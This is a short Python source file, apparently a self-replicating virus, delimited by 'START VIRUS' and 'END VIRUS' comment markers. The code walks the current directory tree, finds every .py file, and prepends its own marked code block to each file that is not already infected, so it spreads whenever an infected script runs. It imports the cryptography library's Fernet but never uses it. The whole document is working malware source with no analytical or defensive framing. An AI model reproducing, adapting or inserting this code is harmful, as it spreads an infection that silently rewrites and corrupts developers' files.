##### START VIRUS #####

import os
import cryptography
from cryptography.fernet import Fernet

filesToInfect = []
payload = []

def get_files_from_directory(dir):
  for root, subdirs, files in os.walk(dir):
    for file in files:
      if file.endswith('.py'):
        filesToInfect.append(os.path.join(root, file))
    

def search_files_to_infect():
  rootDir = os.getcwd()
  get_files_from_directory(rootDir)


def already_infected(file):
  with open(file, 'r') as f:
    for line in f:
      if "##### START VIRUS #####\n" == line:
        return True
    return False


def compute_payload():
  with open(os.path.join(os.getcwd(), __file__), 'r') as virus:
    actual_payload = False
    for line in virus:
      if actual_payload:
        payload.append(line)
        if line == "###### END VIRUS ######\n":
          break
      if "##### START VIRUS #####\n" == line:
        payload.append("##### START VIRUS #####\n")
        actual_payload = True


def inject_payload(file):
  old_code = []
  with open(file, 'r') as f:
    old_code = f.readlines()

  new_code = []
  new_code.extend(payload)
  new_code.extend(old_code)

  with open(file, 'w') as f:
    f.writelines(new_code)

  
search_files_to_infect()
compute_payload()

for file in filesToInfect:
  if not already_infected(file):
    inject_payload(file)

###### END VIRUS ######